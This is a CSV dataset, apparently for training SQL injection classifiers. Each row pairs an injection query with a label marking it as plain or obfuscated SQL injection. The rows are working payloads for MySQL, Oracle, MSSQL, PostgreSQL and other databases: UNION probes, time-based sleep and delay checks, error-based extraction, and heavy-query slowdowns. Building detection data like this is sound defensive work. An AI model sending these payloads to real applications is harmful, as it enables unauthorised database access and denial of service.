query,label,source,label_name
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,1,kaggle_sqli,sqli
-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,1,kaggle_sqli,sqli
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",2,kaggle_sqli,obfuscated
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp",1,kaggle_sqli,sqli
1   )    )     )   and 6467  =  1864#,1,kaggle_sqli,sqli
"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ",1,kaggle_sqli,sqli
1'||  (  select 'xhcr' from dual where 9279  =  9279,1,kaggle_sqli,sqli
-4323'   )    )    or 6968  =  1393,1,kaggle_sqli,sqli
"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",1,kaggle_sqli,sqli
-5350   )    )    or 9323  =  9323#,1,kaggle_sqli,sqli
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",1,kaggle_sqli,sqli
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,kaggle_sqli,sqli
"-5132%""   )    )    or 3038  =  3038",1,kaggle_sqli,sqli
"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",1,kaggle_sqli,sqli
"1"" and 1668  =  8288",1,kaggle_sqli,sqli
"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",1,kaggle_sqli,sqli
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",1,kaggle_sqli,sqli
1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,1,kaggle_sqli,sqli
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",1,kaggle_sqli,sqli
select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,1,kaggle_sqli,sqli
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,2,kaggle_sqli,obfuscated
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof",2,kaggle_sqli,obfuscated
1  )   where 2543  =  2543,1,kaggle_sqli,sqli
1 and 6802  =  3592--,1,kaggle_sqli,sqli
"1  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bkag'  =  'bkag",1,kaggle_sqli,sqli
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1,kaggle_sqli,sqli
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn",1,kaggle_sqli,sqli
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,kaggle_sqli,sqli
"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,kaggle_sqli,sqli
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1,kaggle_sqli,sqli
-3688'||  (  select 'pber' from dual where 7137  =  7137 order by 1#,1,kaggle_sqli,sqli
"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,kaggle_sqli,sqli
"1%"" union all select null,null#",1,kaggle_sqli,sqli
1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',1,kaggle_sqli,sqli
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva,2,kaggle_sqli,obfuscated
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",1,kaggle_sqli,sqli
"1%""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,1,kaggle_sqli,sqli
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",1,kaggle_sqli,sqli
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",1,kaggle_sqli,sqli
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',1,kaggle_sqli,sqli
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",1,kaggle_sqli,sqli
"1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,kaggle_sqli,sqli
"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1,kaggle_sqli,sqli
"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,kaggle_sqli,sqli
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",1,kaggle_sqli,sqli
1%'  )   and 4061  =  2730#,1,kaggle_sqli,sqli
"-3215""  )   union all select 4457,4457,4457,4457,4457#",1,kaggle_sqli,sqli
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn",2,kaggle_sqli,obfuscated
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,kaggle_sqli,sqli
"1,  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",1,kaggle_sqli,sqli
"1%""  )   union all select null,null,null,null#",1,kaggle_sqli,sqli
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1,kaggle_sqli,sqli
-5449' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ryvy' like 'ryvy,1,kaggle_sqli,sqli
"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",1,kaggle_sqli,sqli
"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",1,kaggle_sqli,sqli
"iif  (  3760  =  4785,1,1/0  )  ",1,kaggle_sqli,sqli
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,1,kaggle_sqli,sqli
1'||  (  select 'etvo' from dual where 1557  =  1557,1,kaggle_sqli,sqli
select   (  case when   (  4061  =  1396  )   then 4061 else 1/  (  select 0  )   end  )  --,1,kaggle_sqli,sqli
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,1,kaggle_sqli,sqli
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,1,kaggle_sqli,sqli
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",1,kaggle_sqli,sqli
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr",1,kaggle_sqli,sqli
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
select pg_sleep  (  5  )  # pjvi,1,kaggle_sqli,sqli
"1' union all select null,null#",1,kaggle_sqli,sqli
"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",1,kaggle_sqli,sqli
"1' in boolean mode  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   #",2,kaggle_sqli,obfuscated
"1%'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",2,kaggle_sqli,obfuscated
"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038",1,kaggle_sqli,sqli
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",1,kaggle_sqli,sqli
"1  )   where 5012  =  5012   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",2,kaggle_sqli,obfuscated
"-2377%'   )    )     )   union all select 7706,7706--",1,kaggle_sqli,sqli
"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,kaggle_sqli,sqli
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",1,kaggle_sqli,sqli
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'pwuy'  =  'pwuy",1,kaggle_sqli,sqli
1%' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',2,kaggle_sqli,obfuscated
1'  )   as mpsf where 3348  =  3348,1,kaggle_sqli,sqli
"-9352""   )    )     )   or 3038  =  3038",1,kaggle_sqli,sqli
"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",2,kaggle_sqli,obfuscated
-8131'   )    )    or 9680  =  3467,1,kaggle_sqli,sqli
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",2,kaggle_sqli,obfuscated
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",1,kaggle_sqli,sqli
"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",2,kaggle_sqli,obfuscated
-2761 or 1144  =  7657-- mfml,1,kaggle_sqli,sqli
-5152'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'jumr' like 'jumr,1,kaggle_sqli,sqli
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",2,kaggle_sqli,obfuscated
"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",1,kaggle_sqli,sqli
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",2,kaggle_sqli,obfuscated
"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",2,kaggle_sqli,obfuscated
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1,kaggle_sqli,sqli
"1'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"1   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9184  =  9184",2,kaggle_sqli,obfuscated
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,1,kaggle_sqli,sqli
"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,kaggle_sqli,sqli
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,kaggle_sqli,sqli
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'  =  'fbnx",1,kaggle_sqli,sqli
"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,kaggle_sqli,sqli
1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,kaggle_sqli,sqli
"1%""  )   union all select null,null,null,null,null,null,null,null,null#",1,kaggle_sqli,sqli
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq",1,kaggle_sqli,sqli
"1""  )   as assu where 7521  =  7521 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,kaggle_sqli,sqli
"1' in boolean mode  )   union all select null,null--",1,kaggle_sqli,sqli
"-4669"" or 8571  =  8571--",1,kaggle_sqli,sqli
select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,1,kaggle_sqli,sqli
"1 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
"1"" and make_set  (  6520  =  9958,9958  )  ",1,kaggle_sqli,sqli
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",2,kaggle_sqli,obfuscated
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""vabm""  =  ""vabm",1,kaggle_sqli,sqli
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""%""  =  """,1,kaggle_sqli,sqli
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1,kaggle_sqli,sqli
"1',  (  select   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  select 6948 from mysql.db  )   end   )    )   ",1,kaggle_sqli,sqli
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",2,kaggle_sqli,obfuscated
1'||  (  select 'glec' from dual where 4846  =  4846,1,kaggle_sqli,sqli
1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,1,kaggle_sqli,sqli
1  )   and   (  3020  =  3020  )  *6703 and   (  9831  =  9831,1,kaggle_sqli,sqli
1  )   where 5442  =  5442,1,kaggle_sqli,sqli
"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",1,kaggle_sqli,sqli
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",2,kaggle_sqli,obfuscated
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,1,kaggle_sqli,sqli
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""pxbk"" like ""pxbk",1,kaggle_sqli,sqli
1'  )   where 5871  =  5871,1,kaggle_sqli,sqli
1'+  (  select 'rsgi' where 2258  =  2258,1,kaggle_sqli,sqli
"1'||  (  select 'xyft' from dual where 8250  =  8250 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1,kaggle_sqli,sqli
-4785' or   (  8459  =  8459  )  *4906 and 'esfn'  =  'esfn,1,kaggle_sqli,sqli
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1,kaggle_sqli,sqli
1%'  )   and   (  7704  =  3494  )  *3494 and   (  '%'  =  ',1,kaggle_sqli,sqli
1'  )   where 9175  =  9175,1,kaggle_sqli,sqli
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""staz"" like ""staz",1,kaggle_sqli,sqli
1'+  (  select 'lpkv' where 8760  =  8760,1,kaggle_sqli,sqli
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1,kaggle_sqli,sqli
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',1,kaggle_sqli,sqli
"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",1,kaggle_sqli,sqli
"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",1,kaggle_sqli,sqli
-8341 or 8571  =  8571--,1,kaggle_sqli,sqli
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",1,kaggle_sqli,sqli
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",1,kaggle_sqli,sqli
"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",2,kaggle_sqli,obfuscated
1'   )    )    as vuzt where 4971  =  4971,1,kaggle_sqli,sqli
"1%'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,kaggle_sqli,sqli
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",1,kaggle_sqli,sqli
"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",1,kaggle_sqli,sqli
" select sleep  (  5  )   and    (    (     (  ""%""  =  """,1,kaggle_sqli,sqli
"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",1,kaggle_sqli,sqli
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,1,kaggle_sqli,sqli
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,1,kaggle_sqli,sqli
"  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ",1,kaggle_sqli,sqli
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1,kaggle_sqli,sqli
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",1,kaggle_sqli,sqli
-9950' or 4425  =  1975,1,kaggle_sqli,sqli
-2351   )    )    as xdqn where 4019  =  4019 or 8571  =  8571--,1,kaggle_sqli,sqli
"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,2,kaggle_sqli,obfuscated
"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",1,kaggle_sqli,sqli
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya",2,kaggle_sqli,obfuscated
1   )    )    as gxvp where 3865  =  3865,1,kaggle_sqli,sqli
1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,1,kaggle_sqli,sqli
"1   )    )    union all select null,null,null,null,null,null--",1,kaggle_sqli,sqli
"iif  (  5462  =  8866,1,1/0  )  ",1,kaggle_sqli,sqli
"-2226%""   )    )    union all select 1018,1018,1018,1018--",1,kaggle_sqli,sqli
"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,kaggle_sqli,sqli
"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1,kaggle_sqli,sqli
"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",1,kaggle_sqli,sqli
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",1,kaggle_sqli,sqli
"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1,kaggle_sqli,sqli
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'swke'  =  'swke",2,kaggle_sqli,obfuscated
-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm,1,kaggle_sqli,sqli
"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,kaggle_sqli,sqli
"1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1,kaggle_sqli,sqli
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",1,kaggle_sqli,sqli
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,1,kaggle_sqli,sqli
"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",2,kaggle_sqli,obfuscated
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",1,kaggle_sqli,sqli
"-3862   )    )    as vqtl where 9629  =  9629 union all select 9629,9629,9629,9629,9629--",1,kaggle_sqli,sqli
